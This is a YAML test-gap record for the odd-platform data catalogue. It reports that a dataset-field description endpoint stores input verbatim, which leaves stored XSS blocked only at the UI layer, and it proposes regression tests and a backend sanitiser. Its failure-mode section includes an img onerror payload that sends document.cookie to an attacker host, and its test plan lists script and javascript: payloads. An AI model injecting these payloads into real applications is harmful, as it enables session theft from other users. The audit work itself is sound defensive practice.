@@ -1,0 +1,55 @@
+gap_id: TEST-GAP-993
+category: missing-security
+criticality: HIGH
+node_ids:
+  - "odd-platform java DatasetFieldController controller-class:DatasetFieldController"
+pillars_affected: [P-01, P-09]
+surfaced_by:
+  - "DatasetFieldController.md:bugs_limitations_corner_cases.[4] (Description body persists verbatim — F-004 XSS-class fingerprint at the per-column surface. PUT /api/datasetfields/{id}/description with <script> / <img onerror> / javascript: payloads stores them in dataset_field.internal_description and surfaces them through the field-description tab on the data-entity detail page. Defence-in-depth lives only at the UI render layer (probe P-009 — Markdown.tsx pipeline strips dangerous tags at DOM-render); cross-tab coverage of the DatasetField description render path is unverified — severity MEDIUM)"
+  - "DatasetFieldController.md:tests_coverage_semantic.uncovered_behaviours.[1] (PUT /api/datasetfields/{id}/description with Markdown / HTML / <script> payload returns 200 OK and persists the string verbatim — defence-in-depth lives only at UI render — severity HIGH)"
+behaviour: |-
+  **`PUT /api/datasetfields/{id}/description` persists the description body VERBATIM into `dataset_field.internal_description` — including `<script>` / `<img onerror>` / `javascript:` payloads.** No sanitisation at any backend layer (controller has no validation; service has no `Jsoup.clean`; repository has no `Encode.html` — `ReactiveDatasetFieldRepositoryImpl.java:73-80` shows only empty-to-null normalisation at line 75). The platform's XSS defense is single-layered: UI-side render-layer at `Markdown.tsx` (probe P-009 covered) strips dangerous tags at DOM-render time.
+
+  **F-004 verbatim-storage fingerprint at the column-level surface**:
+  - **Entity-level sibling**: `ReactiveDataEntityRepositoryImpl.setInternalDescription` — same verbatim-storage pattern at the entity level (covered by F-004 batch-R coverage; the entity-level Markdown.tsx render is covered by P-009).
+  - **Column-level surface**: the `DatasetField description tab` renders `dataset_field.internal_description` through the same Markdown component. Whether cross-tab Markdown.tsx coverage applies to DatasetField is UNVERIFIED per F-004 batch-R notes — there's a structural-test-coverage hole.
+
+  **Operator-visible failure modes**:
+  - A malicious user (or a compromised internal account) crafts a description like `<img src=x onerror="fetch('//attacker.com?cookie='+document.cookie)">`. The payload persists in DB. Every other authenticated user viewing the field's description tab triggers the JavaScript (if Markdown.tsx doesn't strip it).
+  - A maintainer refactoring Markdown.tsx (or replacing it with a new render pipeline) could accidentally drop the dangerous-tag stripping. With no backend defense, the entire column-description surface becomes a stored-XSS vector overnight.
+  - Operators auditing log files would see the description column persists unsanitised content but no signal whether the UI render is safe.
+
+  **Why HIGH**:
+  - **Stored XSS at the platform's most-edited surface**: every operator-curated column description is a potential XSS vector if the UI defense slips.
+  - **Defence-in-depth single-layer**: a sanitiser at the DB write boundary would protect against UI-render regression. The current design accepts this gap deliberately — the test gap is the regression-pin that converts "intentional design" into "deliberate test update".
+  - **Cross-pillar amplification (P-01 × P-09)**: dataset-field metadata (P-01) intersects security (P-09); a maintainer auditing P-01 alone misses the security half.
+
+  No test pins this — neither the verbatim-storage contract nor the UI-render defense intersection.
+test_class: missing-security
+test_files_existing: []
+test_files_proposed:
+  path: "odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/DatasetFieldDescriptionVerbatimStorageTest.java"
+  name: "updateDescription_xssPayloadPersistedVerbatim_pinsColumnLevelF004Fingerprint"
+evidence:
+  - "DatasetFieldController.md:bugs_limitations_corner_cases.[4] verbatim: 'Description body persists verbatim — F-004 XSS-class fingerprint at the per-column surface. PUT /api/datasetfields/{id}/description with <script> / <img onerror> / javascript: payloads stores them in dataset_field.internal_description and surfaces them through the field-description tab on the data-entity detail page. Defence-in-depth lives only at the UI render layer (probe P-009 — Markdown.tsx pipeline strips dangerous tags at DOM-render); cross-tab coverage of the DatasetField description render path is unverified per F-004 batch-R notes.' severity: MEDIUM (promoted to HIGH per cross-tab UI render coverage gap + canonical F-004 fingerprint extension to the column-level surface)"
+  - "DatasetFieldController.md:security.known_security_gaps.[2] verbatim: 'Description / internal-name / tags edit endpoints accept verbatim user input with NO backend sanitisation, NO length cap, NO allowlist — F-004 verbatim-storage XSS-class at the per-column surface. Defence-in-depth at the UI render layer (probe P-009 — Markdown.tsx) is the operative safeguard; cross-tab coverage of the DatasetField description render path is unverified.' severity: MEDIUM"
+  - "Verified at primary source: DatasetFieldController.java:36-43 (no validation) + ReactiveDatasetFieldRepositoryImpl.java:73-80 (no Jsoup, no Encode, no length cap, no allowlist)"
+cross_references:
+  - "F-004 (verbatim-storage of operator-supplied content — entity-level sibling)"
+  - "TEST-GAP-289, 290 (sibling F-004 entity-level verbatim-storage tests)"
+  - "P-009 (the canonical Markdown.tsx UI-render-defense probe)"
+  - "concepts.yaml:invariants[Single-layer XSS defense is a design risk — backend store-verbatim relies on UI-render strip; defense-in-depth tests verify both layers]"
+  - "REFACTOR-NNN candidate: add a backend sanitiser (e.g. Jsoup.clean with allowlist OR length cap + escape on save) at the description write boundary; OR explicitly document the single-layer design choice"
+  - "DOC-NNN candidate: surface the verbatim-storage XSS-class on the live data-discovery / annotating-discovered-entities doc — operators authoring descriptions should know their text is rendered through a Markdown pipeline"
+related_features: []
+related_pillar_features: ["P-01:F-004", "P-09:F-001"]
+proposed_action: |-
+  Add `DatasetFieldDescriptionVerbatimStorageTest` at `odd-platform-api/src/test/java/org/opendatadiscovery/oddplatform/api/`. Four test methods:
+  1. `updateDescription_xssPayloadPersistedVerbatim_pinsColumnLevelF004Fingerprint` — PUT description body `<script>alert("XSS")</script>`; GET via DB query; assert dataset_field.internal_description contains the verbatim string. PIN the no-backend-sanitisation contract.
+  2. `updateDescription_imgOnerrorPayload_persistedVerbatim_pinsImageElementVector` — PUT description `<img src=x onerror="alert(1)">`; assert verbatim persistence. PIN the img-element vector.
+  3. `updateDescription_javascriptUriPayload_persistedVerbatim_pinsJavascriptScheme` — PUT description `[click](javascript:alert(1))`; assert verbatim persistence including the javascript: scheme. PIN the markdown-link-scheme vector.
+  4. `getDescription_xssPayloadReturnedVerbatim_pinsAPIResponse` — after test 1 sets the value; GET description endpoint; assert the response body contains the verbatim XSS payload. PIN that the API returns unsanitised content; UI render is the sole defense.
+
+  Pair with UI-side test: WebDriver-driven render test asserting Markdown.tsx strips dangerous tags on the DatasetField description tab specifically (cross-tab coverage). Pair with REFACTOR-NNN: add backend sanitiser OR document the single-layer design. Pair with DOC-NNN: surface the verbatim-storage caveat.
+batch: 2026-05-25-ZG
+feature_id: null
